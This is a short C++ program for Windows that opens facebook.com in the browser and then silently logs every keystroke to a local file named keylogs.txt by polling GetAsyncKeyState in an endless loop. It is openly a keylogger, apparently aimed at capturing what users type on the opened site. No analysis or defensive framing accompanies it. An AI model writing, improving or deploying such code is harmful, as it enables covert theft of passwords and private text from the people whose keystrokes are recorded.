#include <iostream>
#include <fstream>
#include <Windows.h>

int main() {
    // Open website
    ShellExecute(NULL, "open", "https://www.facebook.com", NULL, NULL, SW_SHOWNORMAL);

    // Open log file
    std::ofstream logFile;
    logFile.open("keylogs.txt", std::ios::app);

    // Capture keystrokes
    char key;
    while (true) {
        for (key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                logFile << key;
                logFile.flush();
            }
        }
    }

    logFile.close();
    return 0;
}
